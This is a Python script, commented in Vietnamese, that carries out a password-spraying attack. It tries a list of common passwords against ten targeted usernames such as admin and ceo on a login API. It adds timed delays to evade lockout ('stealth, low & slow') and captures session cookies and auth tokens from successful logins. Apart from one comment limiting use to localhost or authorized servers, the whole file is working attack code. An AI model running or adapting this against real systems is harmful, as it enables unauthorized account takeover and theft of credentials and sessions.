import requests
import time

# Cấu hình mục tiêu (Chỉ test trên localhost hoặc server được phép)
API_URL = "http://localhost:8000/login"

TARGET_USERS = [
    "admin", "ceo", "hr_manager", "it_support", "nguyenvana", 
    "tranvib", "lethic", "sale_01", "marketing", "guest"
]

COMMON_PASSWORDS = [
    "123456", "password", "123456789", "Admin@123", "12345678", 
    "111111", "Cong_ty_123", "qwerty", "12345", "Welcome@123"
]

# Chuyển đổi thành Dictionary để lưu cả Tài khoản lẫn Mật khẩu
compromised_accounts = {}

print("="*60)
print(f"🕵️ BẮT ĐẦU PASSWORD SPRAYING (CHẾ ĐỘ TÀNG HÌNH - LOW & SLOW)")
print(f"Mục tiêu: {len(TARGET_USERS)} users | Vũ khí: {len(COMMON_PASSWORDS)} passwords")
print("="*60 + "\n")

start_time = time.time()
session = requests.Session()

for password in COMMON_PASSWORDS:
    print(f"\n[*] Đang nạp đạn (Mật khẩu): '{password}'...")
    
    for user in TARGET_USERS:
        # Bỏ qua user nếu đã có tên trong danh sách "tử thần" (Dictionary keys)
        if user in compromised_accounts:
            continue
            
        payload = {"username": user, "password": password}
        
        try:
            response = session.post(API_URL, json=payload, timeout=3)
            
            if response.status_code == 200:
                time_elapsed = round(time.time() - start_time, 2)
                
                try:
                    resp_text = str(response.json())
                except ValueError:
                    resp_text = response.text[:300] 
                
                important_headers = {k: v for k, v in response.headers.items() if k.lower() in ['set-cookie', 'authorization', 'x-auth-token']}
                
                print("\n" + "🔥"*30)
                print(f"[+] XÂM NHẬP THÀNH CÔNG TÀI KHOẢN!")
                print(f"    👤 Target User : {user}")
                print(f"    🔑 Password    : {password}")
                print(f"    ⏱️ Thời gian   : Ở giây thứ {time_elapsed}")
                print(f"    🌐 HTTP Status : {response.status_code}")
                if important_headers:
                    print(f"    🍪 Headers     : {important_headers}")
                print(f"    📄 Response    : {resp_text}")
                print("🔥"*30 + "\n")
                
                # LƯU LẠI CẢ USER VÀ PASSWORD KHI THÀNH CÔNG
                compromised_accounts[user] = password
            else:
                print(f"  [-] Trượt: {user} (HTTP {response.status_code})")
                
        except requests.exceptions.RequestException as e:
            print(f"  [!] Lỗi kết nối ({user}): {e.__class__.__name__}")

    sleep_time = 3  
    print(f"\n[*] Đã rải xong mật khẩu '{password}'.")
    print(f"[*] Chờ {sleep_time} giây...")
    time.sleep(sleep_time)

# BÁO CÁO TỔNG KẾT MỚI
print("\n" + "="*60)
print("📊 BÁO CÁO KẾT QUẢ CHIẾN DỊCH")
print(f"Tổng thời gian chạy: {round(time.time() - start_time, 2)} giây")
if compromised_accounts:
    print(f"[!] Đã lấy được quyền truy cập {len(compromised_accounts)} tài khoản:")
    # Duyệt qua Dictionary để in ra cặp Tài khoản - Mật khẩu
    for acc, pwd in compromised_accounts.items():
        print(f"    👉 Tài khoản: {acc:<15} | Mật khẩu: {pwd}")
else:
    print("[+] Server an toàn trước chiến dịch quét này.")
print("="*60)